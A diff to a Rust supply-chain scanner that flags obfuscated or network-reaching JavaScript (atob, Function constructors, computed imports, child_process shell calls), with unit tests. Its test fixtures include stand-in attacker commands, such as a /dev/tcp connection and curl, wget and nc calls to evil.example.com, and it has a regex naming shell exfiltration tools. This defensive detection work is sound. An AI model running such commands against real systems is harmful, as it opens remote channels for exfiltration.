@@ -113,6 +113,13 @@ pub fn check_obfuscation(dir: &Path) -> Vec<Finding> {
     let re_eval = Regex::new(r"eval\s*\(").unwrap();
     let re_hex = Regex::new(r"(?:\\x[0-9a-fA-F]{2}){8,}").unwrap();
     let re_b64 = Regex::new(r#"['"][A-Za-z0-9+/]{100,}={0,2}['"]"#).unwrap();
+    // `\b` + a required `(` guards against matching a bare `atob` identifier or
+    // a comment mention with no call.
+    let re_atob = Regex::new(r"\batob\s*\(").unwrap();
+    // Requires `Function(` / `new Function(` followed directly by a quote — i.e.
+    // a string body. This deliberately does NOT match `Function.prototype` or a
+    // bare `Function` reference (no `(` immediately after in those cases).
+    let re_function_ctor = Regex::new(r#"\bFunction\s*\(\s*['"]"#).unwrap();
 
     let mut findings = Vec::new();
     for path in js_files(dir) {
@@ -153,6 +160,47 @@ pub fn check_obfuscation(dir: &Path) -> Vec<Finding> {
                 "obfuscation",
                 "SUSPECT",
                 "Long base64-like string literal detected (possible encoded payload)",
+                "B2",
+            );
+            f.insert("file".into(), Value::String(file.clone()));
+            findings.push(f);
+        }
+
+        // atob() base64 decode — escalate to BLOCK if the same file also feeds
+        // dynamic execution (eval or a Function() string-constructor), since
+        // decoded-and-executed is high confidence; otherwise it's a SUSPECT
+        // capability note (atob alone is also used by benign browser-shim code).
+        if re_atob.is_match(&content) {
+            if re_eval.is_match(&content) || re_function_ctor.is_match(&content) {
+                let mut f = finding(
+                    "obfuscation",
+                    "BLOCK",
+                    "atob()-decoded payload passed to dynamic execution",
+                    "B2",
+                );
+                f.insert("file".into(), Value::String(file.clone()));
+                findings.push(f);
+            } else {
+                let mut f = finding(
+                    "obfuscation",
+                    "SUSPECT",
+                    "atob() base64 decode detected — possible encoded payload",
+                    "B2",
+                );
+                f.insert("file".into(), Value::String(file.clone()));
+                findings.push(f);
+            }
+        }
+
+        // Function() constructor with a string body — dynamic code execution
+        // equivalent to eval. Kept SUSPECT here even when atob is also present;
+        // the atob rule above already escalates that combination to BLOCK, so
+        // this avoids double-BLOCK-ing the same file for the same root cause.
+        if re_function_ctor.is_match(&content) {
+            let mut f = finding(
+                "obfuscation",
+                "SUSPECT",
+                "Function() constructor with string body — dynamic code execution",
                 "B2",
             );
             f.insert("file".into(), Value::String(file));
@@ -207,11 +255,15 @@ pub fn check_network_imports(dir: &Path) -> Vec<Finding> {
     ];
     let res: Vec<Regex> = patterns.iter().map(|p| Regex::new(p).unwrap()).collect();
 
-    // Shell-exfil vector: child_process exec/spawn invoking curl/wget/nc — lets a
-    // package exfiltrate data or fetch a second-stage payload without importing
-    // any JS network module at all.
+    // Shell-exfil vector: child_process exec/spawn invoking a shell binary/interpreter
+    // (curl/wget/nc/ncat/python/perl/ruby), reading/writing a /dev/tcp/ socket, or
+    // piping through `base64 -d`/`--decode` — lets a package exfiltrate data or fetch
+    // a second-stage payload without importing any JS network module at all.
     let re_child_process = Regex::new(r"child_process").unwrap();
-    let re_shell_exfil_bin = Regex::new(r#"\b(?:curl|wget|nc)\b"#).unwrap();
+    let re_shell_exfil_bin = Regex::new(
+        r#"\b(?:curl|wget|nc|ncat|python3?|perl|ruby)\b|/dev/tcp/|base64\s+(?:-d|--decode)"#,
+    )
+    .unwrap();
 
     let mut hit_files: Vec<String> = Vec::new();
     let mut shell_exfil_files: Vec<String> = Vec::new();
@@ -247,7 +299,7 @@ pub fn check_network_imports(dir: &Path) -> Vec<Finding> {
             "shell_exfil",
             "SUSPECT",
             &format!(
-                "child_process spawning curl/wget/nc in {} file(s) — possible shell-based exfiltration",
+                "child_process spawning a shell/interpreter or using /dev/tcp — possible shell-based exfiltration in {} file(s)",
                 shell_exfil_files.len()
             ),
             "B2",
@@ -259,6 +311,93 @@ pub fn check_network_imports(dir: &Path) -> Vec<Finding> {
         findings.push(f);
     }
 
+    findings
+}
+
+/// Scan .js files for computed dynamic `import()` and systematic split-string
+/// obfuscation (e.g. `'ht' + 'tp'`).
+///
+/// FP-control notes:
+///   - split-string: legit code occasionally concatenates short string literals,
+///     so a single occurrence is not flagged; only 3+ occurrences in one file
+///     (systematic string-splitting, a known obfuscation technique) trip this.
+pub fn check_computed_load(dir: &Path) -> Vec<Finding> {
+    // `import(` whose argument is not a plain string literal, OR contains `+`
+    // concatenation — i.e. the module path is built at runtime. Mirrors
+    // check_dynamic_require's require(variable) coverage, but for import().
+    let re_computed_import_nonliteral = Regex::new(r#"import\s*\(\s*[^'")\s]"#).unwrap();
+    let re_computed_import_concat = Regex::new(r"import\s*\([^)]*\+").unwrap();
+    let re_split_string = Regex::new(r#"['"][A-Za-z]{1,4}['"]\s*\+\s*['"][A-Za-z]{1,4}['"]"#).unwrap();
+
+    let mut findings = Vec::new();
+    for path in js_files(dir) {
+        let Ok(content) = std::fs::read_to_string(&path) else { continue };
+        let file = rel(dir, &path);
+
+        if re_computed_import_nonliteral.is_match(&content) || re_computed_import_concat.is_match(&content) {
+            let mut f = finding(
+                "computed_load",
+                "SUSPECT",
+                "Computed dynamic import() — module path built at runtime",
+                "B2",
+            );
+            f.insert("file".into(), Value::String(file.clone()));
+            findings.push(f);
+        }
+
+        let split_count = re_split_string.find_iter(&content).count();
+        if split_count >= 3 {
+            let mut f = finding(
+                "computed_load",
+                "SUSPECT",
+                &format!("Systematic split-string obfuscation ({split_count} fragments)"),
+                "B2",
+            );
+            f.insert("file".into(), Value::String(file));
+            findings.push(f);
+        }
+    }
+    findings
+}
+
+/// Scan .js files for low-confidence capability notes: `worker_threads` usage and
+/// `.wasm` module references. Both are common in legitimate performance-oriented
+/// packages, so these are INFO-severity (low-weight, doesn't push the verdict) —
+/// they exist to surface capability, not to accuse.
+pub fn check_capability_notes(dir: &Path) -> Vec<Finding> {
+    let re_worker_threads = Regex::new(
+        r#"require\s*\(\s*['"]worker_threads['"]\s*\)|from\s*['"]worker_threads['"]|import\s*\(\s*['"]worker_threads['"]\s*\)"#,
+    )
+    .unwrap();
+    let re_wasm = Regex::new(r"\.wasm\b").unwrap();
+
+    let mut findings = Vec::new();
+    for path in js_files(dir) {
+        let Ok(content) = std::fs::read_to_string(&path) else { continue };
+        let file = rel(dir, &path);
+
+        if re_worker_threads.is_match(&content) {
+            let mut f = finding(
+                "worker_threads",
+                "INFO",
+                "worker_threads used — off-main-thread execution (capability note)",
+                "B2",
+            );
+            f.insert("file".into(), Value::String(file.clone()));
+            findings.push(f);
+        }
+
+        if re_wasm.is_match(&content) {
+            let mut f = finding(
+                "wasm_reference",
+                "INFO",
+                "WebAssembly module referenced (capability note)",
+                "B2",
+            );
+            f.insert("file".into(), Value::String(file));
+            findings.push(f);
+        }
+    }
     findings
 }
 
@@ -444,6 +583,107 @@ mod tests {
         );
     }
 
+    // atob() alone is a SUSPECT capability note — decoding without executing is
+    // lower confidence than eval(Buffer.from()).
+    #[test]
+    fn obfuscation_atob_alone_is_suspect() {
+        let d = dir_with(&[("a.js", "const s = atob('aGVsbG8=');")]);
+        let f = check_obfuscation(d.path());
+        assert!(
+            f.iter().any(|f| f.get("check").and_then(|v| v.as_str()) == Some("obfuscation")
+                && f.get("severity").and_then(|v| v.as_str()) == Some("SUSPECT")
+                && f.get("message").and_then(|v| v.as_str())
+                    == Some("atob() base64 decode detected — possible encoded payload")),
+            "expected atob SUSPECT finding; got: {:?}",
+            f
+        );
+        assert!(vectors(&f).iter().all(|v| v == "B2"));
+    }
+
+    // atob() combined with eval() escalates to BLOCK — decoded-and-executed.
+    #[test]
+    fn obfuscation_atob_plus_eval_blocks() {
+        let d = dir_with(&[("a.js", "eval(atob('Y29uc29sZS5sb2coMSk='));")]);
+        let f = check_obfuscation(d.path());
+        assert!(
+            f.iter().any(|f| f.get("severity").and_then(|v| v.as_str()) == Some("BLOCK")
+                && f.get("message").and_then(|v| v.as_str())
+                    == Some("atob()-decoded payload passed to dynamic execution")),
+            "expected atob+eval BLOCK finding; got: {:?}",
+            f
+        );
+    }
+
+    // atob() combined with a Function() string-constructor also escalates to BLOCK
+    // (the two calls need not be nested — same-file co-occurrence is enough, since
+    // the atob rule checks for the presence of either dynamic-execution primitive).
+    #[test]
+    fn obfuscation_atob_plus_function_ctor_blocks() {
+        let d = dir_with(&[(
+            "a.js",
+            "const payload = atob('cmV0dXJuIDE=');\nconst f = new Function('return 1');",
+        )]);
+        let f = check_obfuscation(d.path());
+        assert!(
+            f.iter().any(|f| f.get("severity").and_then(|v| v.as_str()) == Some("BLOCK")
+                && f.get("message").and_then(|v| v.as_str())
+                    == Some("atob()-decoded payload passed to dynamic execution")),
+            "expected atob+Function-ctor BLOCK finding; got: {:?}",
+            f
+        );
+        // Function-ctor finding itself stays SUSPECT — avoid double-BLOCK for one root cause.
+        assert!(
+            f.iter().any(|f| f.get("severity").and_then(|v| v.as_str()) == Some("SUSPECT")
+                && f.get("message").and_then(|v| v.as_str())
+                    == Some("Function() constructor with string body — dynamic code execution")),
+            "expected Function-ctor SUSPECT finding alongside the BLOCK; got: {:?}",
+            f
+        );
+    }
+
+    // FP-CONTROL: a comment mentioning "atob" with no call must not trip the rule
+    // (word-boundary + required `(` guards this).
+    #[test]
+    fn obfuscation_atob_comment_mention_not_flagged() {
+        let d = dir_with(&[("a.js", "// this uses atob under the hood elsewhere\nconst x = 1;")]);
+        let f = check_obfuscation(d.path());
+        assert!(
+            !f.iter().any(|f| f.get("check").and_then(|v| v.as_str()) == Some("obfuscation")),
+            "comment-only atob mention must not be flagged; got: {:?}",
+            f
+        );
+    }
+
+    #[test]
+    fn obfuscation_function_ctor_string_body_is_suspect() {
+        let d = dir_with(&[("a.js", "const f = new Function('a', 'b', 'return a+b');")]);
+        let f = check_obfuscation(d.path());
+        assert!(
+            f.iter().any(|f| f.get("severity").and_then(|v| v.as_str()) == Some("SUSPECT")
+                && f.get("message").and_then(|v| v.as_str())
+                    == Some("Function() constructor with string body — dynamic code execution")),
+            "expected Function-ctor SUSPECT finding; got: {:?}",
+            f
+        );
+    }
+
+    // FP-CONTROL: Function.prototype.bind must NOT trip the Function-ctor rule
+    // (no `(` immediately after `Function` followed by a quote).
+    #[test]
+    fn obfuscation_function_prototype_bind_not_flagged() {
+        let d = dir_with(&[(
+            "a.js",
+            "function wrap(fn) { return Function.prototype.bind.call(fn, null); }",
+        )]);
+        let f = check_obfuscation(d.path());
+        assert!(
+            !f.iter().any(|f| f.get("message").and_then(|v| v.as_str())
+                == Some("Function() constructor with string body — dynamic code execution")),
+            "Function.prototype.bind must not trip the Function-ctor rule; got: {:?}",
+            f
+        );
+    }
+
     #[test]
     fn suspicious_strings_etc_passwd_blocks() {
         let d = dir_with(&[("a.js", "fs.readFileSync('/etc/passwd');")]);
@@ -531,5 +771,169 @@ mod tests {
     fn dynamic_require_negative() {
         let d = dir_with(&[("a.js", "require('fs');\nrequire();\nconst p = require('path');")]);
         assert!(check_dynamic_require(d.path()).is_empty());
+    }
+
+    // --- check_computed_load: computed dynamic import() ---
+
+    #[test]
+    fn computed_load_dynamic_import_variable_is_suspect() {
+        let d = dir_with(&[("a.js", "const mod = await import(modName);")]);
+        let f = check_computed_load(d.path());
+        assert!(
+            f.iter().any(|f| f.get("check").and_then(|v| v.as_str()) == Some("computed_load")
+                && f.get("severity").and_then(|v| v.as_str()) == Some("SUSPECT")
+                && f.get("message").and_then(|v| v.as_str())
+                    == Some("Computed dynamic import() — module path built at runtime")),
+            "expected computed import() finding; got: {:?}",
+            f
+        );
+        assert!(vectors(&f).iter().all(|v| v == "B2"));
+    }
+
+    #[test]
+    fn computed_load_dynamic_import_concat_is_suspect() {
+        let d = dir_with(&[("a.js", "const mod = await import('./' + name + '.js');")]);
+        let f = check_computed_load(d.path());
+        assert!(
+            checks(&f).contains(&"computed_load".to_string()),
+            "expected computed_load finding for concatenated import(); got: {:?}",
+            f
+        );
+    }
+
+    #[test]
+    fn computed_load_static_import_not_flagged() {
+        let d = dir_with(&[("a.js", "const mod = await import('./fixed-module.js');")]);
+        let f = check_computed_load(d.path());
+        assert!(
+            !f.iter().any(|f| f.get("message").and_then(|v| v.as_str())
+                == Some("Computed dynamic import() — module path built at runtime")),
+            "static import() literal must not be flagged; got: {:?}",
+            f
+        );
+    }
+
+    // --- check_computed_load: split-string obfuscation ---
+
+    #[test]
+    fn computed_load_split_string_systematic_is_suspect() {
+        // Non-overlapping alpha-only fragment pairs — regex matches are
+        // non-overlapping, so each `+` pair must be its own match to count
+        // toward the 3-occurrence threshold.
+        let d = dir_with(&[(
+            "a.js",
+            "const a = 'ab' + 'cd'; const b = 'ef' + 'gh'; const c = 'ij' + 'kl';",
+        )]);
+        let f = check_computed_load(d.path());
+        assert!(
+            f.iter().any(|f| f.get("check").and_then(|v| v.as_str()) == Some("computed_load")
+                && f.get("severity").and_then(|v| v.as_str()) == Some("SUSPECT")
+                && f.get("message")
+                    .and_then(|v| v.as_str())
+                    .map(|m| m.starts_with("Systematic split-string obfuscation"))
+                    .unwrap_or(false)),
+            "expected split-string finding; got: {:?}",
+            f
+        );
+    }
+
+    // FP-CONTROL: a single short-string concatenation is common in legit code and
+    // must NOT be flagged (only 3+ occurrences trip the rule).
+    #[test]
+    fn computed_load_split_string_single_occurrence_not_flagged() {
+        let d = dir_with(&[("a.js", "const label = 'a' + 'b';")]);
+        let f = check_computed_load(d.path());
+        assert!(
+            !f.iter().any(|f| f
+                .get("message")
+                .and_then(|v| v.as_str())
+                .map(|m| m.starts_with("Systematic split-string obfuscation"))
+                .unwrap_or(false)),
+            "single split-string concat must not be flagged; got: {:?}",
+            f
+        );
+    }
+
+    // --- check_network_imports: expanded shell_exfil binary/technique set ---
+
+    #[test]
+    fn shell_exfil_python_spawn_detected() {
+        let d = dir_with(&[(
+            "a.js",
+            "const { exec } = require('child_process'); exec('python3 -c \"import os\"');",
+        )]);
+        let f = check_network_imports(d.path());
+        assert!(checks(&f).contains(&"shell_exfil".to_string()), "got: {:?}", f);
+    }
+
+    #[test]
+    fn shell_exfil_dev_tcp_detected() {
+        let d = dir_with(&[(
+            "a.js",
+            "const { exec } = require('child_process'); exec('exec 3<>/dev/tcp/evil.example.com/4444');",
+        )]);
+        let f = check_network_imports(d.path());
+        assert!(checks(&f).contains(&"shell_exfil".to_string()), "got: {:?}", f);
+    }
+
+    #[test]
+    fn shell_exfil_curl_wget_nc_still_detected() {
+        for bin in ["curl https://evil.example.com", "wget https://evil.example.com", "nc evil.example.com 4444"] {
+            let d = dir_with(&[(
+                "a.js",
+                &format!("const {{ exec }} = require('child_process'); exec('{}');", bin),
+            )]);
+            let f = check_network_imports(d.path());
+            assert!(
+                checks(&f).contains(&"shell_exfil".to_string()),
+                "expected shell_exfil for {}; got: {:?}",
+                bin,
+                f
+            );
+        }
+    }
+
+    // Negative control retained: child_process + a harmless binary (ls) must not trip.
+    #[test]
+    fn shell_exfil_expanded_negative_control() {
+        let d = dir_with(&[(
+            "a.js",
+            "const { exec } = require('child_process'); exec('ls -la');",
+        )]);
+        let f = check_network_imports(d.path());
+        assert!(!checks(&f).contains(&"shell_exfil".to_string()), "got: {:?}", f);
+    }
+
+    // --- check_capability_notes: INFO-severity capability notes ---
+
+    #[test]
+    fn capability_notes_worker_threads_is_info() {
+        let d = dir_with(&[("a.js", "const { Worker } = require('worker_threads');")]);
+        let f = check_capability_notes(d.path());
+        assert!(
+            f.iter().any(|f| f.get("check").and_then(|v| v.as_str()) == Some("worker_threads")
+                && f.get("severity").and_then(|v| v.as_str()) == Some("INFO")),
+            "expected worker_threads INFO finding; got: {:?}",
+            f
+        );
+        assert!(vectors(&f).iter().all(|v| v == "B2"));
+    }
+
+    #[test]
+    fn capability_notes_wasm_reference_is_info() {
+        let d = dir_with(&[("a.js", "const bytes = fs.readFileSync('./module.wasm');")]);
+        let f = check_capability_notes(d.path());
+        assert!(
+            f.iter().any(|f| f.get("check").and_then(|v| v.as_str()) == Some("wasm_reference")
+                && f.get("severity").and_then(|v| v.as_str()) == Some("INFO")),
+            "expected wasm_reference INFO finding; got: {:?}",
+            f
+        );
+    }
+
+    #[test]
+    fn capability_notes_clean_file_not_flagged() {
+        let d = dir_with(&[("a.js", "const path = require('path');\nmodule.exports = { add: (a, b) => a + b };")]);
+        assert!(check_capability_notes(d.path()).is_empty());
     }
 }
